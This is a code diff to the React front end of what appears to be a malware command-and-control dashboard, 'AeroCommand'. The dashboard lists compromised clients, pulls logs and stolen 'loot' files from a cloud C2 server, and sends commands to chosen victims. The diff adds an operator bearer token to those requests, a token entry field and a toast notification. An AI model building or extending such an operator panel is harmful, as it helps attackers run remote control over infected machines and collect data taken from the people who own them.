@@ -100,6 +100,8 @@ export default function App() {
   
   // Cloud C2 Server Sync State
   const [c2ServerUrl, setC2ServerUrl] = useState<string>(() => localStorage.getItem('c2_server_url') || 'https://your-c2-service.onrender.com');
+  const [c2OperatorToken, setC2OperatorToken] = useState<string>(() => localStorage.getItem('c2_operator_token') || '');
+  const authHeader = { 'Authorization': `Bearer ${c2OperatorToken}` };
   const [c2Mode, setC2Mode] = useState<'cloud' | 'local'>(() => (localStorage.getItem('c2_mode') as any) || 'cloud');
   const [c2ConnectionStatus, setC2ConnectionStatus] = useState<'connected' | 'connecting' | 'error'>('connecting');
   
@@ -141,6 +143,15 @@ export default function App() {
   const [processList, setProcessList] = useState<ProcessEntry[]>([]);
   const [isProcessesLoading, setIsProcessesLoading] = useState(false);
   const [processSearch, setProcessSearch] = useState('');
+
+  // Toast Notification State
+  const [toastMessage, setToastMessage] = useState<string | null>(null);
+  const showToast = (msg: string) => {
+    setToastMessage(msg);
+    setTimeout(() => {
+      setToastMessage(null);
+    }, 3500);
+  };
 
   // Terminal State
   const [termInput, setTermInput] = useState('');
@@ -195,7 +206,7 @@ export default function App() {
         if (c2Mode === 'cloud' && c2ServerUrl) {
           const cleanUrl = c2ServerUrl.replace(/\/+$/, '');
           try {
-            const clientsRes = await fetch(`${cleanUrl}/api/clients`);
+            const clientsRes = await fetch(`${cleanUrl}/api/clients`, { headers: authHeader });
             if (clientsRes.ok) {
               backendClients = await clientsRes.json();
               setC2ConnectionStatus('connected');
@@ -205,7 +216,7 @@ export default function App() {
           }
 
           try {
-            const logsRes = await fetch(`${cleanUrl}/api/logs`);
+            const logsRes = await fetch(`${cleanUrl}/api/logs`, { headers: authHeader });
             if (logsRes.ok) {
               backendLogs = await logsRes.json();
             }
@@ -289,7 +300,7 @@ export default function App() {
           if (c2Mode === 'cloud' && c2ServerUrl) {
             const cleanUrl = c2ServerUrl.replace(/\/+$/, '');
             try {
-              const lootRes = await fetch(`${cleanUrl}/api/loot`);
+              const lootRes = await fetch(`${cleanUrl}/api/loot`, { headers: authHeader });
               if (lootRes.ok) {
                 setLootFiles(await lootRes.json());
               }
@@ -736,7 +747,7 @@ export default function App() {
         const cleanUrl = c2ServerUrl.replace(/\/+$/, '');
         const res = await fetch(`${cleanUrl}/api/send_command`, {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
+          headers: { 'Content-Type': 'application/json', ...authHeader },
           body: JSON.stringify({ client_id: targetId, command: cmd }),
         });
         if (res.ok) {
@@ -2041,8 +2052,8 @@ export default function App() {
                     <div>
                       <label className="block text-xs font-bold text-slate-300 mb-1.5">Render Cloud C2 Endpoint URL</label>
                       <div className="flex items-center space-x-2">
-                        <input 
-                          type="text" 
+                        <input
+                          type="text"
                           value={c2ServerUrl}
                           onChange={(e) => setC2ServerUrl(e.target.value)}
                           placeholder="https://your-c2-service.onrender.com"
@@ -2051,11 +2062,34 @@ export default function App() {
                         <button
                           onClick={() => {
                             localStorage.setItem('c2_server_url', c2ServerUrl.trim());
-                            alert('Server URL saved! Reconnecting...');
+                            showToast('Server URL saved successfully! Reconnecting to cloud...');
+                          }}
+                          className="px-3.5 py-2 bg-c2accent hover:bg-blue-600 text-white rounded-md text-xs font-bold transition-colors shadow-sm"
+                          title={toastMessage || ''}
+                        >
+                          Save & Connect
+                        </button>
+                      </div>
+                    </div>
+
+                    <div>
+                      <label className="block text-xs font-bold text-slate-300 mb-1.5">Operator Token</label>
+                      <div className="flex items-center space-x-2">
+                        <input
+                          type="password"
+                          value={c2OperatorToken}
+                          onChange={(e) => setC2OperatorToken(e.target.value)}
+                          placeholder="Enter your OPERATOR_TOKEN from .env"
+                          className="flex-1 bg-c2bg border border-c2border focus:border-c2accent rounded-md px-3 py-2 text-xs font-mono text-white outline-none transition-colors"
+                        />
+                        <button
+                          onClick={() => {
+                            localStorage.setItem('c2_operator_token', c2OperatorToken.trim());
+                            showToast('Operator token saved! Reconnecting to cloud...');
                           }}
                           className="px-3.5 py-2 bg-c2accent hover:bg-blue-600 text-white rounded-md text-xs font-bold transition-colors shadow-sm"
                         >
-                          Save & Connect
+                          Save Token
                         </button>
                       </div>
                     </div>
@@ -2279,6 +2313,14 @@ export default function App() {
               <span>AeroCommand Live Stream Engine</span>
             </div>
           </div>
+        </div>
+      )}
+
+      {/* TOAST NOTIFICATION */}
+      {toastMessage && (
+        <div className="fixed bottom-6 right-6 z-50 flex items-center space-x-2.5 bg-[#1A2235] border border-c2accent text-white px-4 py-3 rounded-xl shadow-2xl animate-fade-in text-xs font-medium">
+          <div className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></div>
+          <span>{toastMessage}</span>
         </div>
       )}
     </div>
